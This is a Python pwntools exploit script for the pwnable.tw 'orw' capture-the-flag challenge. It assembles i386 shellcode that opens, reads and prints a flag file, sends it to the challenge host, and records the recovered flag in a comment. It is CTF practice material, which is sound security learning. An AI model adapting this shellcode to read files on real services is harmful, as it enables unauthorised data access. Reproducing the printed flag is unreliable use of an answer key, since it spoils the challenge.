from pwn import *
import sys,getopt
import time,math


args = sys.argv[1:]
context(os='linux', arch='i386')
debug = 1 if '-nd' not in args else 0

proc_name = 'orw'
local = 1 if '-r' not in args else 0
attach = local & 1
bps = attach & 0
#socat TCP4-LISTEN:10001,fork EXEC:./pwn1
ip = 'chall.pwnable.tw'
port = 10001
io = None

def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def sd(data):
	return io.send(data)
def rl():
	return io.recvline()

def pushstr(string='/home/orw/flag',length=4):
    log.info('pushasm' + string)
    string = string[::-1]
    pushstr = ''
    times = int(math.ceil(float(len(string))/length))
    startpos = 0
    for i in range(1,times+1): 
        ilen = (len(string) - (times-i)*length)
        ilen = ilen if ilen < length else length
        istring = string[startpos:startpos+ilen].encode('hex')
        pushstr += 'push 0x%s;' % istring
        log.info('start '+str(startpos)+' end '+str(startpos+ilen))
        startpos += ilen
    log.info(pushstr)
    #log.info("/home/orw/flag\x00".encode('hex'))
    return pushstr
'''
    int  fd;
    char buf[100] = {0};
    fd = open("/tmp/flag",0,0);
    read(fd,buf,50);
    write(1,buf,50);
    close(fd);
  
'''
def testasm():
    shellcode = asm("xor ecx,ecx;xor edx,edx;")
    shellcode +=  asm("mov eax,0x5;" + pushstr() + "mov ebx,esp;int 0x80;")
    shellcode +=  asm("mov ebx,eax;mov eax,0x3;mov ecx,0x0804a000;mov edx,100;int 0x80;")
    shellcode +=  asm("mov eax,0x4;mov ebx,1;mov ecx,0x0804a000;mov edx,100;int 0x80;")
    shellcode +=  asm("xor ebx,ebx;mov eax,0x06;int 0x80;")
    return shellcode

def pwn():
    makeio()
    if debug:
        context.log_level = 'debug'
    if attach:
        if bps:
            gdb.attach(pidof(proc_name)[0], open('bps'))
        else:
            gdb.attach(pidof(proc_name)[0])
    
    ru("shellcode:")
    sl(testasm())
    log.info(rv())

if __name__ == '__main__':
	pwn()
    # FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}    



